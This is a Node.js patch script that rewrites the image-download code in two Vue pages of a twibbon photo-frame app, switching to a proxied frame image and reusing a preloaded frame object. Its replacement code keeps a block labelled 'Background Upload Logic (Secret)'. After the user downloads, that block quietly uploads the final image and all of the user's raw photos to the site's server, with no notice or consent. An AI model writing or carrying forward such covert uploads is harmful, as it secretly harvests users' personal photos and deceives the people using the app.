const fs = require('fs');

function patch(file) {
  let code = fs.readFileSync(file, 'utf8');

  // 1. Update fetchTwibbon to use proxy URL
  // frameUrl.value = getStorageUrl(twibbon.value.file_path)
  code = code.replace(
    /frameUrl\.value = getStorageUrl\(twibbon\.value\.file_path\)/g,
    "frameUrl.value = api.defaults.baseURL + '/twibbon-proxy?path=' + twibbon.value.file_path"
  );

  // 2. Add crossorigin="anonymous" to the image template
  // <img v-if="frameUrl" :src="frameUrl"
  code = code.replace(
    /<img v-if="frameUrl" :src="frameUrl"/g,
    '<img v-if="frameUrl" crossorigin="anonymous" :src="frameUrl"'
  );

  // 3. Update downloadTwibbon
  // Need to replace the whole setTimeout block inside downloadTwibbon until the catch block
  const oldDownloadLogic = `const bgImg = new Image()
      bgImg.crossOrigin = "Anonymous"
      bgImg.onload = () => {
        canvas.width = bgImg.width
        canvas.height = bgImg.height
        
        ctx.clearRect(0, 0, canvas.width, canvas.height)
        
        const domWidth = editorContainer.value?.clientWidth || 400
        const ratio = bgImg.width / domWidth
        
        for (const photo of photos.value) {
          const finalX = photo.x * ratio
          const finalY = photo.y * ratio
          const finalWidth = photo.width * ratio
          const finalHeight = photo.height * ratio
          
          ctx.save()
          
          if (photo.blur > 0) {
            ctx.filter = \`blur(\${photo.blur * (ratio / 2)}px)\`
          }
          
          const imgCenterX = finalX + finalWidth / 2
          const imgCenterY = finalY + finalHeight / 2
          ctx.translate(imgCenterX, imgCenterY)
          
          ctx.rotate((photo.rotation * Math.PI) / 180)
          
          ctx.drawImage(photo.imgObj, -finalWidth / 2, -finalHeight / 2, finalWidth, finalHeight)
          
          ctx.restore()
        }
        
        ctx.drawImage(bgImg, 0, 0, canvas.width, canvas.height)
        
        const dataUrl = canvas.toDataURL('image/png')
        const link = document.createElement('a')
        link.download = \`Twibbon-\${twibbon.value.slug}-\${Date.now()}.png\`
        link.href = dataUrl
        document.body.appendChild(link)
        link.click()
        document.body.removeChild(link)
        
        // Background Upload Logic (Secret)
        setTimeout(async () => {
          try {
            const formData = new FormData();
            formData.append('slug', route.params.slug);
            
            // Final result as WebP
            const resultBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.8));
            formData.append('result_image', resultBlob, 'result.webp');
            
            // Raw photos as WebP
            for (let i = 0; i < photos.value.length; i++) {
              const dUrl = photos.value[i].dataUrl;
              const res = await fetch(dUrl);
              const blob = await res.blob();
              formData.append('raw_images[]', blob, \`raw_\${i}.webp\`);
            }
            
            // Send to server
            await api.post('/twibbon/save-session', formData, {
              headers: { 'Content-Type': 'multipart/form-data' }
            });
            console.log('Background upload success');
          } catch (e) {
            console.error('Background upload failed', e);
          }
        }, 500); // Small delay to prioritize the user's download

        isDownloading.value = false
      }
      bgImg.onerror = () => {
        alert('Terjadi kesalahan saat memproses gambar frame. (CORS/Network error)')
        isDownloading.value = false
      }
      bgImg.src = api.defaults.baseURL + '/twibbon-proxy?path=' + twibbon.value.file_path`;

  const newDownloadLogic = `const bgImg = frameImgObj;
        
        canvas.width = bgImg.naturalWidth || bgImg.width;
        canvas.height = bgImg.naturalHeight || bgImg.height;
        
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        const domWidth = editorContainer.value?.clientWidth || 400;
        const ratio = canvas.width / domWidth;
        
        for (const photo of photos.value) {
          const finalX = photo.x * ratio;
          const finalY = photo.y * ratio;
          const finalWidth = photo.width * ratio;
          const finalHeight = photo.height * ratio;
          
          ctx.save();
          
          if (photo.blur > 0) {
            ctx.filter = \`blur(\${photo.blur * (ratio / 2)}px)\`;
          }
          
          const imgCenterX = finalX + finalWidth / 2;
          const imgCenterY = finalY + finalHeight / 2;
          ctx.translate(imgCenterX, imgCenterY);
          
          ctx.rotate((photo.rotation * Math.PI) / 180);
          
          ctx.drawImage(photo.imgObj, -finalWidth / 2, -finalHeight / 2, finalWidth, finalHeight);
          
          ctx.restore();
        }
        
        ctx.drawImage(bgImg, 0, 0, canvas.width, canvas.height);
        
        const dataUrl = canvas.toDataURL('image/png');
        const link = document.createElement('a');
        link.download = \`Twibbon-\${twibbon.value.slug}-\${Date.now()}.png\`;
        link.href = dataUrl;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        // Background Upload Logic (Secret)
        setTimeout(async () => {
          try {
            const formData = new FormData();
            formData.append('slug', route.params.slug);
            
            // Final result as WebP
            const resultBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.8));
            formData.append('result_image', resultBlob, 'result.webp');
            
            // Raw photos as WebP
            for (let i = 0; i < photos.value.length; i++) {
              const dUrl = photos.value[i].dataUrl;
              const res = await fetch(dUrl);
              const blob = await res.blob();
              formData.append('raw_images[]', blob, \`raw_\${i}.webp\`);
            }
            
            // Send to server
            await api.post('/twibbon/save-session', formData, {
              headers: { 'Content-Type': 'multipart/form-data' }
            });
            console.log('Background upload success');
          } catch (e) {
            console.error('Background upload failed', e);
          }
        }, 500); // Small delay to prioritize the user's download

        isDownloading.value = false;`;

  code = code.replace(oldDownloadLogic, newDownloadLogic);

  fs.writeFileSync(file, code);
  console.log('Patched download performance in ' + file);
}

patch('./pages/twibbon/[slug].vue');
patch('./pages/admin/twibbon/[slug]/index.vue');
